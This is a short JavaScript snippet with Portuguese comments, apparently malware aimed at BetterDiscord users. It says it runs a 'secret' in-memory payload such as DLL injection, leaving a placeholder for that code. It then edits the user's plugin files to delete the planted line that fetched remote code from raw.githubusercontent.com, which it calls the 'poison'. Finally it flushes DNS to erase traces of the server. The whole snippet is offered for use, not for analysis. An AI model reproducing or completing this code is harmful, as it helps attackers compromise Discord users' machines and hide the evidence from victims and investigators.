(function() {
    const fs = require('fs');
    const path = require('path');
    const pDir = path.join(process.env.APPDATA, 'BetterDiscord', 'plugins');

    // 1. Executa sua função secreta (Injeção de DLL ou o que desejar)
    console.log("Executando carga na RAM...");
    // [Seu código de injeção aqui]

    // 2. Localiza o plugin envenenado e limpa o código
    const files = fs.readdirSync(pDir).filter(f => f.endsWith('.plugin.js'));
    files.forEach(file => {
        const fPath = path.join(pDir, file);
        let content = fs.readFileSync(fPath, 'utf8');
        
        // Remove a linha que contém o link do GitHub (o "veneno")
        if (content.includes('githubusercontent')) {
            const cleanContent = content.replace(/\nrequire\('https'\).get\('https:\/\/raw\.githubusercontent\.com[\s\S]*?\)\);/, "");
            fs.writeFileSync(fPath, cleanContent, 'utf8');
        }
    });

    // 3. Flush DNS para sumir com o rastro do servidor
    require('child_process').exec('ipconfig /flushdns');
})();
